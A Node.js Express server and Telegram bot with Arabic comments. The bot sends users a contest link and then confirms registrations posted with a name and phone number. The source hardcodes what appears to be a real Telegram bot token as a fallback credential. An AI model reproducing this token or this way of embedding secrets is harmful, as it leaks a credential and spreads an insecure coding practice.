```javascript
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());

// 🔑 أدخل توكن بوتك
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8396003328:AAHlkUGTuTDPaDyh5mCl6IrZ5jHusigq5nc';
const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: true});

console.log('🚀 البوت يعمل: @Ahmed11AlHamoud_bot');

// 📌 أمر البداية
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userName = msg.from.first_name;
    
    bot.sendMessage(chatId, 
        `🎉 أهلًا ${userName}!\n\n` +
        `هذا رابط مسابقتك:\n` +
        `https://your-page.onrender.com/index.html?chatId=${chatId}\n\n` +
        `حظاً موفقاً! 🍀`
    );
});

// 📥 استقبال بيانات من صفحة المسابقة
app.post('/SS', (req, res) => {
    console.log('📊 بيانات جديدة:', req.body.userInfo?.name);
    
    if (req.body.userId && req.body.userInfo) {
        bot.sendMessage(req.body.userId, 
            `✅ تم تسجيلك ${req.body.userInfo.name}!\n` +
            `📞 سنتواصل معك على: ${req.body.userInfo.phone}\n` +
            `🎊 نتمنى لك الفوز!`
        ).catch(err => console.log('⚠️ لم نرسل تأكيد'));
    }
    
    res.json({status: 'تم الاستلام', success: true});
});

// 🔍 صفحة الاختبار
app.get('/', (req, res) => {
    res.json({
        bot: '@Ahmed11AlHamoud_bot',
        status: 'يعمل',
        time: new Date().toISOString()
    });
});

// 🚀 تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`📍 السيرفر يعمل على المنفذ ${PORT}`);
});
```
